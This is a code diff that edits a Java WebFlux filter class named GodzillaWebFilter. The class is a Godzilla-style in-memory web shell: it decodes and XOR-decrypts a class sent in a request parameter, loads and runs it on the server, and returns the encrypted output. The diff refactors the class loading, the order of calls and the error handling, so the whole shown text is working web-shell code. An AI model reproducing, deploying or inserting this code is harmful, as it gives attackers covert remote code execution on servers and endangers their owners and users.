@@ -49,24 +49,24 @@ public class GodzillaWebFilter extends ClassLoader implements WebFilter {
                 byte[] data = base64Decode(map.getFirst(pass));
                 data = x(data, false);
                 if (payload == null) {
-                    payload = (Class) new GodzillaWebFilter(this.getClass().getClassLoader()).Q(data);
+                    payload = new GodzillaWebFilter(Thread.currentThread().getContextClassLoader()).Q(data);
                 } else {
                     ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                     Object f = payload.getDeclaredConstructor().newInstance();
                     f.equals(arrOut);
-                    f.equals(data);
                     f.equals(exchange.getRequest());
-                    result.append(md5.substring(0, 16));
+                    f.equals(data);
                     f.toString();
+                    result.append(md5.substring(0, 16));
                     result.append(base64Encode(x(arrOut.toByteArray(), true)));
                     result.append(md5.substring(16));
                 }
-            } catch (Exception ignored) {
+            } catch (Throwable e) {
+                e.printStackTrace();
             }
             return Mono.just(new DefaultDataBufferFactory().wrap(result.toString().getBytes(StandardCharsets.UTF_8)));
         });
     }
-
 
     @SuppressWarnings("all")
     public static String base64Encode(byte[] bs) throws Exception {
@@ -77,18 +77,15 @@ public class GodzillaWebFilter extends ClassLoader implements WebFilter {
             Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Encoder");
-                Object encoder = base64.newInstance();
-                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Encoder");
+            Object encoder = base64.newInstance();
+            value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
         }
         return value;
     }
 
     @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) {
+    public static byte[] base64Decode(String bs) throws Exception {
         byte[] value = null;
         Class<?> base64;
         try {
@@ -96,12 +93,9 @@ public class GodzillaWebFilter extends ClassLoader implements WebFilter {
             Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Decoder");
+            Object decoder = base64.newInstance();
+            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
         return value;
     }
